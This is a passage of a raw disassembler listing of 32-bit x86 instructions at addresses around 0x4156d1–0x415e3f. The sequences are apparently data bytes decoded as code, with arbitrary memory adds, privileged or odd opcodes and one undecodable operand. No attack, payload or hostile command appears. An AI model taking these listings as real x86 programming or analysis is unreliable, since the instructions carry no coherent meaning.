  4156d1:	or     dl,ah
  4156d3:	inc    eax
  4156d4:	clc    
  4156d5:	and    BYTE PTR [eax],al
  4156d7:	add    al,BYTE PTR [ebp-0x74]
  4156da:	add    BYTE PTR [eax],dl
  4156dc:	adc    dl,dl
  4156de:	xor    ebp,DWORD PTR ds:0x20010c0
  4156e4:	add    BYTE PTR [eax],cl
  4156e6:	mov    al,0x50
  4156e8:	add    BYTE PTR [eax],dl
  4156ea:	sub    dl,BYTE PTR [eax]
  4156ec:	add    BYTE PTR [eax],al
  4156ee:	and    BYTE PTR [eax],ch
  4156f0:	add    dh,BYTE PTR [eax+0x40001082]
  4156f6:	add    DWORD PTR [ecx+eax*1+0x40834500],edx
  4156fd:	add    al,BYTE PTR [eax]
  4156ff:	pop    ss
  415700:	test   BYTE PTR [edx+0xc000447],al
  415706:	add    BYTE PTR [eax],al
  415708:	pop    eax
  415709:	dec    eax
  41570a:	xchg   ecx,eax
  41570b:	add    DWORD PTR [eax],eax
  41570d:	add    BYTE PTR [eax+0x55],al
  415710:	add    BYTE PTR ds:0x40620c0,cl
  415716:	or     BYTE PTR [eax],0x85
  415719:	add    DWORD PTR [edx],0x2200070
  41571f:	or     BYTE PTR [ecx],cl
  415721:	adc    edx,DWORD PTR [eax+0x84a022]
  415727:	add    al,0x10
  415729:	dec    ecx
  41572a:	or     BYTE PTR [ecx],ah
  41572c:	push   eax
  41572d:	add    BYTE PTR [esp+eax*1+0xa005],cl
  415734:	or     BYTE PTR [ecx+eax*1],0x1
  415738:	adc    BYTE PTR [edx],al
  41573a:	test   BYTE PTR [eax+0x55],cl
  41573d:	add    BYTE PTR [edx],al
  41573f:	add    BYTE PTR [edi+0x7414000],dl
  415745:	inc    esp
  415746:	mov    DWORD PTR [eax],ecx
  415748:	and    dl,BYTE PTR [eax]
  41574a:	add    BYTE PTR [eax+0x2814202],bl
  415750:	or     DWORD PTR [edx+0x20],eax
  415753:	or     BYTE PTR [edx],al
  415755:	xor    ah,BYTE PTR [eax]
  415757:	add    BYTE PTR [eax+eax*1],dl
  41575a:	mov    BYTE PTR [eax],al
  41575c:	add    al,0x1
  41575e:	mov    BYTE PTR [eax+0x10084228],dl
  415764:	mov    ds:0xe8015037,al
  415769:	cmp    BYTE PTR [eax],0x6
  41576c:	dec    ebx
  41576d:	inc    esi
  41576e:	xor    DWORD PTR [ecx],0x4
  415771:	add    BYTE PTR [ecx+0x600a2068],al
  415777:	jo     0x4156fa
  415779:	add    BYTE PTR [eax+0x4],0x20
  41577d:	and    BYTE PTR [ecx],dl
  41577f:	add    eax,0x3d421912
  415784:	or     al,0xc8
  415786:	adc    BYTE PTR [eax+0x470008],al
  41578c:	inc    ecx
  41578d:	add    BYTE PTR ds:0x9432840,0x40
  415794:	add    BYTE PTR [eax+eax*1],al
  415797:	push   es
  415798:	and    BYTE PTR [eax],dl
  41579a:	adc    BYTE PTR [esp+eax*2],dl
  41579d:	and    BYTE PTR [edx+eax*1+0x2a],al
  4157a1:	test   al,0x8
  4157a3:	add    BYTE PTR [eax],al
  4157a5:	or     al,BYTE PTR [eax]
  4157a7:	add    BYTE PTR [edx+edx*1],al
  4157aa:	mov    al,ds:0x30846004
  4157af:	push   es
  4157b0:	inc    edx
  4157b1:	inc    eax
  4157b2:	adc    BYTE PTR [eax],ch
  4157b4:	adc    DWORD PTR [eax],edx
  4157b6:	or     BYTE PTR [ecx+0x25],cl
  4157b9:	dec    esp
  4157ba:	add    BYTE PTR [eax],dl
  4157bc:	test   al,0x80
  4157be:	add    ecx,DWORD PTR [eax]
  4157c0:	mov    al,ds:0x9000610
  4157c5:	add    BYTE PTR [eax],ch
  4157c7:	add    BYTE PTR [eax+0x42082228],0x32
  4157ce:	adc    BYTE PTR [eax+0x6],al
  4157d1:	pop    ds
  4157d2:	add    BYTE PTR [eax+eax*1+0x2],dl
  4157d6:	add    BYTE PTR [edx+eax*1+0x1042084],al
  4157dd:	inc    ecx
  4157de:	and    esp,DWORD PTR [edx]
  4157e0:	inc    ebx
  4157e1:	add    BYTE PTR [eax],al
  4157e3:	inc    eax
  4157e4:	or     DWORD PTR [eax],eax
  4157e6:	and    DWORD PTR [eax],esp
  4157e8:	and    BYTE PTR [edx],0x50
  4157eb:	cmp    DWORD PTR [eax],0x20008290
  4157f1:	pusha  
  4157f2:	or     BYTE PTR [eax-0x15df7eff],0xc
  4157f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157fa:	inc    eax
  4157fb:	add    BYTE PTR [eax],al
  4157fd:	and    BYTE PTR [eax],al
  4157ff:	add    BYTE PTR [edx],cl
  415801:	or     BYTE PTR [edx],0x10
  415804:	adc    BYTE PTR [eax],ah
  415806:	sub    al,0x0
  415808:	mov    al,ds:0x49000000
  41580d:	add    BYTE PTR [ebp+0x65102200],0x40
  415814:	mov    ds:0x22006204,eax
  415819:	add    BYTE PTR [eax],cl
  41581b:	pusha  
  41581c:	sub    BYTE PTR [eax],0x9
  41581f:	mov    ds:0x41b08028,eax
  415824:	pusha  
  415825:	add    BYTE PTR [eax],al
  415827:	add    al,al
  415829:	add    dl,BYTE PTR [edx]
  41582b:	mov    cl,BYTE PTR [edx]
  41582d:	add    eax,0x20040018
  415832:	nop
  415833:	add    BYTE PTR [ebx+0x1],ah
  415836:	add    DWORD PTR [eax],eax
  415838:	add    cl,0x24
  41583b:	nop
  41583c:	mov    BYTE PTR [edx],al
  41583e:	add    BYTE PTR [eax],al
  415840:	inc    ecx
  415841:	add    BYTE PTR [ebp+0x8],dl
  415844:	add    BYTE PTR [eax],0x52
  415847:	adc    BYTE PTR [eax+0x0],al
  41584a:	sbb    BYTE PTR [eax],al
  41584c:	add    BYTE PTR [eax],al
  41584e:	and    DWORD PTR [eax+eiz*4+0xd3600a],esp
  415855:	inc    esp
  415856:	adc    BYTE PTR [eax],al
  415858:	push   ecx
  415859:	add    BYTE PTR [ebp+0x8],bl
  41585c:	cwde   
  41585d:	nop
  41585e:	add    BYTE PTR [eax],dl
  415860:	add    BYTE PTR [edx],dh
  415862:	add    BYTE PTR [eax],cl
  415864:	mov    al,ds:0xa0017
  415869:	add    BYTE PTR [eax],al
  41586b:	or     BYTE PTR [esp],al
  41586e:	add    BYTE PTR [eax],al
  415870:	add    eax,0x82000000
  415875:	inc    eax
  415876:	inc    eax
  415877:	adc    BYTE PTR [eax+0x5],al
  41587a:	and    BYTE PTR [eax],0x80
  41587d:	and    DWORD PTR [eax],esp
  41587f:	add    BYTE PTR [eax],al
  415881:	sub    cl,BYTE PTR [eax]
  415883:	rcl    BYTE PTR [eax],0x20
  415886:	ret    0x1440
  415889:	mov    DWORD PTR [eax],edx
  41588b:	fs loop 0x4158a6
  41588e:	add    BYTE PTR [eax],ah
  415890:	add    al,0x0
  415892:	sbb    DWORD PTR [ecx],edx
  415894:	add    BYTE PTR [eax],0xa3
  415897:	and    BYTE PTR [ebx+eax*2+0x280],cl
  41589e:	inc    ebp
  41589f:	push   ebx
  4158a0:	adc    BYTE PTR [edx-0x5d],al
  4158a3:	add    BYTE PTR [eax],ah
  4158a5:	sbb    al,BYTE PTR [eax]
  4158a7:	add    BYTE PTR [eax],al
  4158a9:	add    ah,BYTE PTR [eax]
  4158ab:	add    BYTE PTR [edx+edx*1],al
  4158ae:	test   DWORD PTR [esi-0x3f5f6f00],ebp
  4158b4:	add    BYTE PTR [eax],cl
  4158b6:	add    BYTE PTR [edx],dl
  4158b8:	adc    BYTE PTR [eax+0x48],al
  4158bb:	add    dl,BYTE PTR [eax]
  4158bd:	or     BYTE PTR [eax+0x6c],al
  4158c0:	pusha  
  4158c1:	push   ebp
  4158c2:	add    BYTE PTR [eax-0x6db40000],cl
  4158c8:	or     al,BYTE PTR [ecx+0x0]
  4158cb:	add    BYTE PTR [edi],al
  4158cd:	test   DWORD PTR [eax+0x8],ecx
  4158d0:	enter  0xa9b,0x0
  4158d4:	and    al,0x10
  4158d6:	cld    
  4158d7:	rol    BYTE PTR [ecx+0x12],0x0
  4158db:	mov    eax,ds:0x10040202
  4158e0:	adc    al,0x0
  4158e2:	popa   
  4158e3:	es aad 0x0
  4158e6:	push   0x2cc2000
  4158eb:	rcl    BYTE PTR [ecx-0x78],0x1b
  4158ef:	add    BYTE PTR [eax],dl
  4158f1:	add    eax,DWORD PTR [eax+0x48]
  4158f4:	add    BYTE PTR [eax],al
  4158f6:	mov    eax,ds:0x4ac08022
  4158fb:	inc    edx
  4158fc:	add    BYTE PTR [ebx],al
  4158fe:	add    al,0xe
  415900:	add    BYTE PTR [eax+0x803d8c0],al
  415906:	and    dh,cl
  415908:	add    BYTE PTR [eax+0x55414045],al
  41590e:	mov    al,BYTE PTR [ecx+0x28]
  415911:	or     BYTE PTR [eax],al
  415913:	sub    ah,cl
  415915:	or     BYTE PTR [ecx-0x80],cl
  415918:	and    BYTE PTR [eax],bl
  41591a:	add    BYTE PTR [ecx],al
  41591c:	sbb    DWORD PTR [eax+0x100a7801],0x80880
  415926:	and    eax,DWORD PTR [eax+eiz*1]
  415929:	add    DWORD PTR [eax],0x5010000
  41592f:	or     al,BYTE PTR [eax]
  415931:	add    BYTE PTR [edx+eax*2+0x0],0x8
  415936:	and    eax,DWORD PTR [eax]
  415938:	in     al,0x0
  41593a:	nop
  41593b:	loopne 0x41594d
  41593d:	add    DWORD PTR [eax+0x204014a],ecx
  415943:	and    al,0x9
  415945:	add    BYTE PTR [esp+eax*1+0x10],bl
  415949:	pusha  
  41594a:	add    BYTE PTR [eax],al
  41594c:	add    cl,BYTE PTR [eax+0x6]
  41594f:	rol    BYTE PTR [eax+0x2],cl
  415952:	adc    BYTE PTR ds:0x52400200,al
  415958:	add    al,BYTE PTR [eax+0x0]
  41595b:	add    al,0x49
  41595d:	test   DWORD PTR [eax+eax*1],eax
  415960:	add    BYTE PTR [ecx],dl
  415962:	push   ecx
  415963:	add    BYTE PTR [eax+edx*4+0x60],ah
  415967:	add    BYTE PTR [ecx+0x0],dh
  41596a:	and    BYTE PTR [eax],al
  41596c:	add    BYTE PTR [esi+0x105e1010],dl
  415972:	add    BYTE PTR [edx+0x2800194],al
  415978:	inc    eax
  415979:	xor    al,0x42
  41597b:	xor    BYTE PTR [edx],dl
  41597d:	add    BYTE PTR [eax],al
  41597f:	adc    BYTE PTR [eax],al
  415981:	inc    esp
  415982:	add    al,BYTE PTR [esi]
  415984:	add    al,0xa3
  415986:	add    BYTE PTR [eax],al
  415988:	jecxz  0x415917
  41598a:	rol    DWORD PTR [eax],0x4
  41598d:	inc    eax
  41598e:	push   ebx
  41598f:	mov    al,ds:0x4000089c
  415994:	add    DWORD PTR [eax],0x3c403806
  41599a:	xor    BYTE PTR [eax],0x30
  41599d:	bound  eax,QWORD PTR [eax+0x5]
  4159a0:	add    al,BYTE PTR [eax]
  4159a2:	sbb    BYTE PTR [ecx-0x6],al
  4159a5:	push   eax
  4159a6:	xchg   edx,eax
  4159a7:	or     BYTE PTR [eax],0x81
  4159aa:	or     al,BYTE PTR [eax+0x1840000]
  4159b0:	add    DWORD PTR [ecx+0x202000],edx
  4159b6:	nop
  4159b7:	push   ds
  4159b8:	or     eax,0xc0040
  4159bd:	pop    es
  4159be:	add    BYTE PTR [eax+0x4],al
  4159c1:	mov    al,ds:0x10060
  4159c6:	inc    eax
  4159c7:	and    BYTE PTR [ecx+0x18],ah
  4159ca:	xchg   edx,eax
  4159cb:	adc    al,0x0
  4159cd:	ret    0x4200
  4159d0:	and    BYTE PTR [eax],0x51
  4159d3:	add    eax,DWORD PTR [esi-0x70]
  4159d6:	add    BYTE PTR [eax+eax*2+0x10],cl
  4159da:	add    BYTE PTR [edx+0x90090b3],al
  4159e0:	cmp    BYTE PTR [edx+0x29202004],ah
  4159e6:	sub    BYTE PTR [eax],al
  4159e8:	sbb    ah,BYTE PTR [eax]
  4159ea:	adc    BYTE PTR [eax],ch
  4159ec:	mov    al,ds:0x49094180
  4159f1:	and    al,0x40
  4159f3:	add    BYTE PTR [eax],cl
  4159f5:	add    BYTE PTR [eax],bl
  4159f7:	adc    BYTE PTR [eax-0x5e],cl
  4159fa:	inc    eax
  4159fb:	mov    al,ds:0x71002228
  415a00:	and    DWORD PTR [edi+0x4],0x40a09e9
  415a07:	and    BYTE PTR [ecx+0x52],al
  415a0a:	add    BYTE PTR [eax],ah
  415a0c:	adc    dl,BYTE PTR [ecx]
  415a0e:	add    BYTE PTR [eax],al
  415a10:	inc    esi
  415a11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a12:	adc    DWORD PTR ds:0x4c41840,eax
  415a18:	add    dh,BYTE PTR [edx]
  415a1a:	push   ebp
  415a1b:	and    al,0xc0
  415a1d:	add    al,al
  415a1f:	push   ebx
  415a20:	or     al,0x48
  415a22:	add    ch,BYTE PTR [ecx+0x0]
  415a25:	dec    eax
  415a26:	add    BYTE PTR [edx+0x42000300],bl
  415a2c:	add    al,0x4
  415a2f:	jne    0x415a35
  415a31:	add    DWORD PTR [ebx+eiz*4],edx
  415a34:	add    BYTE PTR [eax],0x40
  415a37:	add    eax,0x14a0810
  415a3c:	adc    al,BYTE PTR [ecx-0x7e]
  415a3f:	or     BYTE PTR [edx+0x0],al
  415a42:	add    BYTE PTR [eax],ah
  415a44:	inc    eax
  415a45:	add    DWORD PTR [eax+0x41],ecx
  415a48:	inc    eax
  415a49:	or     al,0x0
  415a4b:	inc    edx
  415a4c:	push   es
  415a4d:	push   ds
  415a4e:	mov    BYTE PTR [ecx],al
  415a50:	xchg   esi,eax
  415a51:	pop    ebp
  415a52:	mov    ch,0x4b
  415a54:	add    ah,cl
  415a56:	add    BYTE PTR [edi],dl
  415a58:	popa   
  415a59:	pusha  
  415a5a:	icebp  
  415a5b:	sub    BYTE PTR [eax],dl
  415a5d:	nop
  415a5e:	data16 adc BYTE PTR [ecx+0x41],cl
  415a62:	xor    ah,al
  415a64:	inc    ecx
  415a65:	pusha  
  415a66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a67:	dec    eax
  415a68:	add    eax,0xb00c000
  415a6d:	xchg   ebp,eax
  415a6e:	adc    eax,DWORD PTR [ebx]
  415a70:	add    BYTE PTR [eax+0x60],al
  415a73:	add    BYTE PTR [eax],al
  415a75:	add    BYTE PTR [eax+edx*4+0x1],dh
  415a79:	add    BYTE PTR [eax],al
  415a7b:	mov    al,BYTE PTR [edx]
  415a7d:	jg     0x415a9f
  415a7f:	add    BYTE PTR [edi],dl
  415a81:	or     DWORD PTR [ecx+0x10020084],ebx
  415a87:	or     DWORD PTR [ecx+0x42],esp
  415a8a:	adc    eax,0x41054a
  415a8f:	push   ebp
  415a90:	add    al,0xc0
  415a92:	call   0x20415afd
  415a97:	add    al,al
  415a99:	retf   0x440
  415a9c:	inc    ecx
  415a9d:	or     BYTE PTR [ecx+0x28],al
  415aa0:	or     BYTE PTR [eax-0x7f],al
  415aa3:	add    BYTE PTR [ecx],al
  415aa5:	or     BYTE PTR [eax],al
  415aa7:	pop    ecx
  415aa8:	add    BYTE PTR [eax],ah
  415aaa:	sbb    BYTE PTR [ebp+0x21],cl
  415aad:	add    DWORD PTR [eax-0x3a7bfffc],ecx
  415ab3:	and    al,BYTE PTR [eax]
  415ab5:	adc    eax,DWORD PTR [eax]
  415ab7:	or     BYTE PTR [eax+0x4],cl
  415aba:	add    BYTE PTR [eax],al
  415abc:	add    BYTE PTR [ecx],al
  415abe:	and    al,0x8c
  415ac0:	and    BYTE PTR [eax],al
  415ac2:	add    al,BYTE PTR [eax]
  415ac4:	add    cl,al
  415ac6:	or     BYTE PTR [ecx+0x9a2800e],dl
  415acc:	xchg   BYTE PTR [ecx+0x48],al
  415acf:	and    BYTE PTR [ecx-0x73dff980],ch
  415ad5:	add    DWORD PTR [eax],eax
  415ad7:	dec    edx
  415ad8:	add    ebp,eax
  415ada:	push   ebx
  415adb:	pop    eax
  415adc:	add    BYTE PTR ds:0xc0084804,cl
  415ae2:	mov    BYTE PTR [eax],al
  415ae4:	inc    eax
  415ae5:	or     BYTE PTR [ecx],al
  415ae7:	jno    0x415b29
  415ae9:	push   es
  415aea:	leave  
  415aeb:	adc    BYTE PTR [edx],ah
  415aed:	mov    al,ds:0x2402a1
  415af2:	and    al,0x41
  415af4:	add    BYTE PTR [edx+0x4],al
  415af7:	add    BYTE PTR [eax],al
  415af9:	adc    BYTE PTR [eax],al
  415afb:	add    BYTE PTR [eax],dh
  415afd:	sbb    dl,BYTE PTR [eax]
  415aff:	adc    BYTE PTR [eax+0x73208055],dh
  415b05:	and    BYTE PTR [eax],al
  415b07:	sub    BYTE PTR [ecx+eax*2],ah
  415b0a:	or     BYTE PTR [eax+0x16a114],0x2
  415b11:	add    DWORD PTR [eax+0x20008745],0xc0c50245
  415b1b:	push   ecx
  415b1c:	add    esp,DWORD PTR [ecx]
  415b1e:	adc    DWORD PTR [ecx+0x24042098],eax
  415b24:	sub    al,0x5d
  415b26:	mov    DWORD PTR [eax],eax
  415b28:	mov    DWORD PTR [eax],ecx
  415b2a:	add    eax,0x2f01a004
  415b2f:	and    BYTE PTR [edx],cl
  415b31:	sub    BYTE PTR [eax],0xa4
  415b34:	add    BYTE PTR [eax+eax*2],al
  415b37:	popa   
  415b38:	sbb    al,BYTE PTR [eax]
  415b3a:	add    BYTE PTR [eax+edi*1+0x14],dl
  415b3e:	test   DWORD PTR [eax+eax*1-0x6cd7bf5f],esp
  415b45:	cwde   
  415b46:	add    al,BYTE PTR [eax]
  415b48:	add    BYTE PTR [eax],ah
  415b4a:	add    BYTE PTR [eax],al
  415b4c:	adc    BYTE PTR [eax],al
  415b4e:	inc    esp
  415b4f:	and    BYTE PTR [ecx],al
  415b51:	pusha  
  415b52:	xor    BYTE PTR [eax+ebx*1+0x55],ah
  415b56:	xor    eax,0x168400c1
  415b5b:	adc    al,0x20
  415b5d:	add    BYTE PTR [eax+0x20],al
  415b60:	add    BYTE PTR [ecx+0x0],al
  415b63:	adc    BYTE PTR [eax],dl
  415b65:	mov    ecx,0x10308248
  415b6a:	mov    eax,0x410a0001
  415b6f:	add    DWORD PTR [edx-0x7f],esp
  415b72:	inc    eax
  415b73:	or     BYTE PTR [ecx-0x3e],ah
  415b76:	add    BYTE PTR [eax],0x82
  415b79:	add    BYTE PTR [esp-0x5ffaca6f],al
  415b80:	push   ss
  415b81:	add    BYTE PTR [edx],al
  415b83:	add    BYTE PTR [eax+0x45164010],al
  415b89:	mov    al,0xbb
  415b8b:	and    BYTE PTR [ecx+0x42841010],al
  415b91:	pusha  
  415b92:	and    al,0x0
  415b94:	add    BYTE PTR ds:0x4c94106b,ah
  415b9a:	add    BYTE PTR [eax],ah
  415b9c:	add    BYTE PTR [eax],dl
  415b9e:	add    ah,BYTE PTR [edx]
  415ba0:	sbb    al,BYTE PTR [eax]
  415ba2:	add    BYTE PTR [eax+eax*1],0x2
  415ba6:	or     BYTE PTR [ebx+0x40516409],cl
  415bac:	add    BYTE PTR [eax+0x50001],dl
  415bb2:	add    DWORD PTR [eax+eax*1+0x0],esp
  415bb6:	add    BYTE PTR [eax],0x4
  415bb9:	add    BYTE PTR [eax],al
  415bbb:	rol    BYTE PTR [edx+ebx*1+0x44010801],1
  415bc2:	nop
  415bc3:	and    al,BYTE PTR [ecx+0x4410c400]
  415bc9:	add    BYTE PTR [eax],al
  415bcb:	or     BYTE PTR [ecx],al
  415bcd:	dec    eax
  415bce:	mov    BYTE PTR [eax-0x7eeb8000],ah
  415bd4:	push   eax
  415bd5:	add    al,0x41
  415bd7:	dec    eax
  415bd8:	nop
  415bd9:	add    dh,BYTE PTR [ebp+0x9]
  415bdc:	add    BYTE PTR [ecx],0x86
  415bdf:	add    BYTE PTR [eax],al
  415be1:	add    BYTE PTR [eax],ah
  415be3:	add    BYTE PTR [eax-0x78],0x60
  415be7:	add    BYTE PTR [ecx+0x5320],al
  415bed:	sbb    DWORD PTR [eax],esi
  415bef:	add    BYTE PTR [eax],al
  415bf1:	cdq    
  415bf2:	and    ch,ah
  415bf4:	adc    BYTE PTR [eax],0x37
  415bf7:	or     BYTE PTR [eax],al
  415bf9:	add    al,BYTE PTR [eax]
  415bfb:	push   esp
  415bfc:	mov    al,ds:0xc1401400
  415c01:	popa   
  415c02:	add    BYTE PTR [eax],bl
  415c04:	adc    BYTE PTR [ecx+0x30],ah
  415c07:	inc    eax
  415c08:	add    DWORD PTR [ecx],eax
  415c0a:	add    BYTE PTR [eax+0x40d8b028],bl
  415c10:	inc    ebx
  415c11:	inc    ecx
  415c12:	or     BYTE PTR [eax],ah
  415c14:	fwait
  415c15:	add    BYTE PTR [eax],0x43
  415c18:	inc    eax
  415c19:	inc    ecx
  415c1a:	xor    al,BYTE PTR [eax-0x48]
  415c1d:	lea    eax,[eax]
  415c1f:	and    BYTE PTR [eax],cl
  415c21:	inc    ecx
  415c22:	and    BYTE PTR [eax+0x4922048],al
  415c28:	and    BYTE PTR [eax],ah
  415c2a:	adc    cl,BYTE PTR [eax+0x18202029]
  415c30:	inc    eax
  415c31:	cmp    al,BYTE PTR [eax+eax*2+0x10001000]
  415c38:	push   cs
  415c39:	add    BYTE PTR [eax+eax*1],al
  415c3c:	sub    DWORD PTR [eax],eax
  415c3e:	mov    BYTE PTR [eax+0x0],ah
  415c41:	and    BYTE PTR [eax+0x140083],bh
  415c47:	les    ecx,FWORD PTR [esp+eiz*4+0x3000040]
  415c4e:	add    BYTE PTR [eax],al
  415c50:	inc    ecx
  415c51:	inc    ebp
  415c52:	add    BYTE PTR [ebx],ah
  415c54:	dec    ecx
  415c55:	add    BYTE PTR [eax],al
  415c57:	add    BYTE PTR [eax],dl
  415c59:	or     BYTE PTR [edx],al
  415c5b:	or     al,0x18
  415c5d:	add    DWORD PTR [ecx],eax
  415c5f:	add    al,0x0
  415c61:	inc    ecx
  415c62:	add    BYTE PTR [eax+0x50],0x49
  415c66:	xor    al,0x0
  415c68:	add    BYTE PTR [eax],dl
  415c6a:	sbb    BYTE PTR [ecx+0x5],al
  415c6d:	or     BYTE PTR [edx],al
  415c6f:	add    BYTE PTR [eax],al
  415c71:	add    al,0x1
  415c73:	mov    dh,BYTE PTR [esi-0x60]
  415c76:	adc    BYTE PTR [eax-0x6cf7ffbf],ah
  415c7c:	add    BYTE PTR [eax+edx*1],al
  415c7f:	jne    0x415cc1
  415c81:	adc    eax,DWORD PTR [eax]
  415c83:	add    DWORD PTR [edx+eax*1],ecx
  415c86:	and    BYTE PTR [eax+eax*1-0x4b],ah
  415c8a:	mov    BYTE PTR [eax+eiz*4+0x45],dh
  415c8e:	and    ah,BYTE PTR [eax]
  415c90:	mov    BYTE PTR [eax],0x0
  415c93:	add    BYTE PTR [eax+edx*4],cl
  415c96:	add    BYTE PTR [eax],0x1
  415c99:	add    BYTE PTR [eax],0x80
  415c9c:	add    al,0x0
  415c9e:	add    DWORD PTR [ecx+0x2821],ebx
  415ca4:	mov    WORD PTR [ebx+0x4],ds
  415ca7:	add    BYTE PTR [eax],0x80
  415caa:	inc    eax
  415cab:	retf   0x80
  415cae:	add    DWORD PTR [eax],0x5ad340c0
  415cb4:	or     al,ah
  415cb6:	test   BYTE PTR [eax],dl
  415cb8:	mov    WORD PTR [eax],es
  415cba:	add    BYTE PTR [eax],bh
  415cbc:	jbe    0x415cbf
  415cbe:	cmp    BYTE PTR [ecx],0x8
  415cc1:	add    BYTE PTR [eax+0x3a],al
  415cc4:	push   esp
  415cc5:	mov    ecx,eax
  415cc7:	or     DWORD PTR ds:0x40c408c0,eax
  415ccd:	mov    ah,BYTE PTR [eax]
  415ccf:	add    BYTE PTR [eax+0x61003000],al
  415cd5:	add    BYTE PTR [eax+0x2],al
  415cd8:	pusha  
  415cd9:	ror    BYTE PTR [ecx+0x41],cl
  415cdc:	sub    al,0xa2
  415cde:	mov    es,WORD PTR [eax]
  415ce0:	inc    eax
  415ce1:	add    BYTE PTR [eax-0x5ff00000],0x0
  415ce8:	add    al,BYTE PTR [eax]
  415cea:	and    BYTE PTR [eax],al
  415cec:	add    DWORD PTR [ecx],eax
  415cee:	add    BYTE PTR [edx+eax*4],0x21
  415cf2:	add    cl,BYTE PTR [eax+0x602a0a51]
  415cf8:	sub    BYTE PTR [eax],al
  415cfa:	add    al,ah
  415cfc:	adc    BYTE PTR [eax-0x74],al
  415cff:	add    al,BYTE PTR [eax]
  415d01:	push   eax
  415d02:	add    al,0x4
  415d04:	popa   
  415d05:	test   DWORD PTR [esi],ecx
  415d07:	add    BYTE PTR [eax],al
  415d09:	mov    cl,0x31
  415d0b:	inc    eax
  415d0c:	rol    BYTE PTR [ecx-0x7fffff8d],1
  415d12:	add    ah,BYTE PTR [ecx]
  415d14:	nop
  415d15:	adc    BYTE PTR [eax],al
  415d17:	add    cl,dl
  415d19:	or     BYTE PTR [eax+0x0],cl
  415d1c:	mov    WORD PTR [ecx+0x8],?
  415d1f:	call   0xc8:0x8000348
  415d26:	add    BYTE PTR [eax+0x10],al
  415d29:	add    BYTE PTR [eax],cl
  415d2b:	mov    al,ds:0x8104120
  415d30:	add    cl,BYTE PTR [edx]
  415d32:	adc    DWORD PTR [edx+0x2840050],eax
  415d38:	add    esp,DWORD PTR [eax]
  415d3a:	add    bl,BYTE PTR [edx+0xa005420]
  415d40:	and    BYTE PTR [eax],ah
  415d42:	adc    cl,ah
  415d44:	add    al,0x0
  415d46:	add    BYTE PTR [eax],cl
  415d48:	add    BYTE PTR [ecx],al
  415d4a:	inc    edx
  415d4b:	inc    eax
  415d4c:	add    BYTE PTR [eax+0x2],0x90
  415d50:	and    BYTE PTR [eax],al
  415d52:	or     BYTE PTR [ecx+0x2],al
  415d55:	inc    eax
  415d56:	xchg   edx,eax
  415d57:	add    BYTE PTR [eax+eiz*1],al
  415d5a:	popa   
  415d5b:	inc    eax
  415d5c:	push   ds
  415d5d:	or     BYTE PTR [edx+0x8240002],ch
  415d63:	add    BYTE PTR [eax],dl
  415d65:	rol    DWORD PTR [edi+0x904aa0],1
  415d6b:	inc    ecx
  415d6c:	and    BYTE PTR [eax],al
  415d6e:	adc    eax,DWORD PTR [eax]
  415d70:	and    BYTE PTR [ecx],ch
  415d72:	add    al,0x0
  415d74:	mov    WORD PTR [ecx+0x10],es
  415d77:	push   esp
  415d78:	or     BYTE PTR [eax-0x7e],ah
  415d7b:	inc    edx
  415d7c:	mov    bh,0x2
  415d7e:	or     al,cl
  415d80:	inc    eax
  415d81:	add    BYTE PTR [ecx],al
  415d83:	add    BYTE PTR [edx],0x90
  415d86:	rol    DWORD PTR [eax],0xc0
  415d89:	add    BYTE PTR [ecx],ah
  415d8b:	add    al,BYTE PTR [eax]
  415d8d:	and    BYTE PTR [ecx],al
  415d8f:	out    0x0,eax
  415d91:	mov    al,0x4
  415d93:	add    BYTE PTR [ecx+0x0],al
  415d96:	adc    DWORD PTR [eax],eax
  415d98:	adc    ah,0x81
  415d9b:	add    BYTE PTR [ecx+ecx*1],al
  415d9e:	and    BYTE PTR [eax-0x38],al
  415da1:	inc    eax
  415da2:	add    BYTE PTR [ecx],al
  415da4:	dec    eax
  415da5:	add    BYTE PTR [ecx+0x24],al
  415da8:	adc    BYTE PTR [ecx],al
  415daa:	adc    BYTE PTR [eax],dl
  415dac:	add    bl,BYTE PTR [eax]
  415dae:	or     al,0x0
  415db0:	inc    ecx
  415db1:	inc    ecx
  415db2:	or     DWORD PTR [eax+0x2444000],eax
  415db8:	sbb    DWORD PTR [eax],eax
  415dba:	inc    eax
  415dbb:	and    BYTE PTR [eax],ah
  415dbd:	inc    ebx
  415dbe:	add    al,BYTE PTR [eax+eax*1+0x30]
  415dc2:	add    BYTE PTR [eax],bh
  415dc4:	adc    DWORD PTR [eax],eax
  415dc6:	rol    BYTE PTR [eax],0x0
  415dc9:	ficom  DWORD PTR [eax+0x44000155]
  415dcf:	loopne 0x415de9
  415dd1:	inc    eax
  415dd2:	push   ss
  415dd3:	adc    al,0x0
  415dd5:	push   eax
  415dd6:	add    BYTE PTR ds:0x88800240,0x0
  415ddd:	add    BYTE PTR [eax],0x15
  415de0:	or     eax,eax
  415de2:	add    BYTE PTR ds:0x4607a100,al
  415de8:	add    BYTE PTR [edx+0x0],cl
  415deb:	inc    esp
  415dec:	and    BYTE PTR [eax],al
  415dee:	add    BYTE PTR [edx],ah
  415df0:	add    BYTE PTR [eax+0x24],dl
  415df3:	or     BYTE PTR ds:0xc4001040,al
  415df9:	inc    eax
  415dfa:	add    BYTE PTR [ecx+ecx*2],al
  415dfd:	add    al,BYTE PTR [eax]
  415dff:	test   BYTE PTR [eax+eax*2],al
  415e02:	add    BYTE PTR [eax],ah
  415e04:	adc    BYTE PTR [edx],al
  415e06:	add    al,0x0
  415e08:	inc    eax
  415e09:	add    al,0x58
  415e0b:	or     BYTE PTR [eax],ah
  415e0d:	adc    DWORD PTR [eax+eax*1+0x0],esp
  415e11:	rol    DWORD PTR [eax],1
  415e13:	add    eax,0x380400
  415e18:	jo     0x415e23
  415e1a:	and    BYTE PTR [ebx],0x82
  415e1d:	sbb    BYTE PTR [eax],al
  415e1f:	add    BYTE PTR [ecx],dl
  415e21:	add    BYTE PTR [edx],al
  415e23:	popa   
  415e24:	mov    BYTE PTR [ecx],dh
  415e26:	add    BYTE PTR [edx+eax*1],al
  415e29:	add    BYTE PTR [eax+eax*1+0x21],dl
  415e2d:	and    BYTE PTR [edx+0x0],ah
  415e30:	and    BYTE PTR [eax],0x42
  415e33:	test   al,0x24
  415e35:	or     BYTE PTR [edi],bl
  415e37:	add    BYTE PTR [eax],cl
  415e39:	add    al,0x88
  415e3b:	test   BYTE PTR [eax],bl
  415e3d:	and    BYTE PTR [ecx],al
  415e3f:	add    BYTE PTR [eax],al
